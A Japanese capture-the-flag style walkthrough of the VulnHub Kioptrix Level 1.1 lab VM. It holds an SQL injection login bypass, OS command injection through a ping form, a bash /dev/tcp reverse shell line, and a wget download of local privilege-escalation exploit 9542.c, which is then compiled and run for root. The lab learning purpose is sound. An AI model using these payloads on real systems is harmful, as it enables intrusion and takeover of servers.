## Description
- Kioptrix: Level 1.1 (#2)を利用してバッファーオーバーフローによる特権昇格を学ぶ
- Kalilinuxを攻撃サーバとしてVM環境に構築。KioptrixもVM環境で構築する

### 参考情報
https://www.vulnhub.com/
https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

Kalilinuxの構築
https://qiita.com/y-araki-qiita/items/4621a21e9f0d2e38c331
Kiopritrixのサーバ構築
https://medium.com/@obikag/how-to-get-kioptrix-working-on-virtualbox-an-oscp-story-c824baf83da1

## 1, IPアドレスを特定する
- `netdiscover`コマンドにてIPを調査

## 2, 特定したIPに対してNmapスキャンを実行し、使用しているサービスを特定する
- `nmap`コマンドにて使用サービスを調査 
```
$ sudo nmap -Pn 192.168.11.13
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 21:33 JST
Nmap scan report for 192.168.11.13
Host is up (0.00098s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql
MAC Address: 08:00:27:4F:B1:15 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.11 seconds
```
6つのポートが空いてるのを確認

- Nmapスキャンでもっと詳しく調べてみる。
```
$ sudo nmap -Pn -T4 -sV -A -v 192.168.11.13
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 21:36 JST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Initiating ARP Ping Scan at 21:36
Scanning 192.168.11.13 [1 port]
Completed ARP Ping Scan at 21:36, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:36
Completed Parallel DNS resolution of 1 host. at 21:36, 13.01s elapsed
Initiating SYN Stealth Scan at 21:36
Scanning 192.168.11.13 [1000 ports]
Discovered open port 443/tcp on 192.168.11.13
Discovered open port 111/tcp on 192.168.11.13
Discovered open port 3306/tcp on 192.168.11.13
Discovered open port 80/tcp on 192.168.11.13
Discovered open port 22/tcp on 192.168.11.13
Discovered open port 631/tcp on 192.168.11.13
Completed SYN Stealth Scan at 21:36, 0.05s elapsed (1000 total ports)
Initiating Service scan at 21:36
Scanning 6 services on 192.168.11.13
Completed Service scan at 21:36, 12.03s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against 192.168.11.13
NSE: Script scanning 192.168.11.13.
Initiating NSE at 21:36
Completed NSE at 21:36, 0.39s elapsed
Initiating NSE at 21:36
Completed NSE at 21:36, 1.15s elapsed
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Nmap scan report for 192.168.11.13
Host is up (0.00038s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_ssl-date: 2020-03-26T16:36:38+00:00; +3h59m58s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:4F:B1:15 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.023 days (since Thu Mar 26 21:04:05 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=200 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 3h59m57s

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 192.168.11.13

NSE: Script Post-scanning.
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Initiating NSE at 21:36
Completed NSE at 21:36, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.362KB)
```

## 3, 443,80ポートが空いているのでブラウザからアクセスをしてみる
- http://192.168.11.13
ログイン画面が確認出来た

## 4, SQLインジェクションでログインを試みる
```
Username: ' or 1=1--
Password ' OR 1=1--
```
ログイン成功

## 5, [Ping a Machine on the Network] という機能が提供されている
- 適当にIPを打ち込んでみる 127.0.0.1
```
127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.030 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.144 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2010ms
rtt min/avg/max/mdev = 0.020/0.064/0.144/0.057 ms, pipe 2
```
http://192.168.11.13/pingit.php
が新たに開き、pingの標準入力結果が表示されている。

## 6, OSコマンドインジェクションを試みる
- 127.0.0.1; ls -al　を入力してみる
```
127.0.0.1; ls -al
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.021 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.015/0.020/0.024/0.003 ms, pipe 2
total 24
drwxr-xr-x  2 root root 4096 Oct  8  2009 .
drwxr-xr-x  8 root root 4096 Oct  7  2009 ..
-rwxr-Sr-t  1 root root 1733 Feb  9  2012 index.php
-rwxr-Sr-t  1 root root  199 Oct  8  2009 pingit.php
```
pingの結果の後にls -alの結果が表示されていることを確認出来た。

## 7, OSコマンドインジェクションを利用してBashを利用したリバースシェルを行う
- 攻撃サーバにてncコマンドで接続を待ち受ける
```
$ nc -lvp 4444
listening on [any] 4444 ...
```

- ブラウザにてリバースシェルのコマンド構文を入力する
```
; bash -i >& /dev/tcp/192.168.11.12/4444 0>&1
```
攻撃サーバにbashが表示される

## 8, サーバ内の調査
OSのバージョンを調査する
```
$ cat /etc/redhat-release
CentOS release 4.5 (Final)
```

## 9, searchsploitでCentOS4.5の脆弱性を検索する
```
$ searchsploit CentOS 4.5
```
9542.c(EDB-ID: 9542)がを使用して特権昇格として使用出来そう

## 10, 標的サーバにコードを送る
- 攻撃サーバにてローカルサーバを立ち上げる
```
$ python -m SimpleHTTPServer 8080
```

### 11, リバースシェルをしたサーバ内で攻撃サーバからコードをダウンロードする
- 権限の関係の為、tmp配下にダウンロードを試みる
```
$ cs /tmp
$ wget http://192.168.11.12:8080/9542.c
```

### 12, ダウンロードしたコードをコンパイルして実行
```
$ gcc 9542.c -o 9542
$ ./9542
$ whoami
root
```
特権昇格！

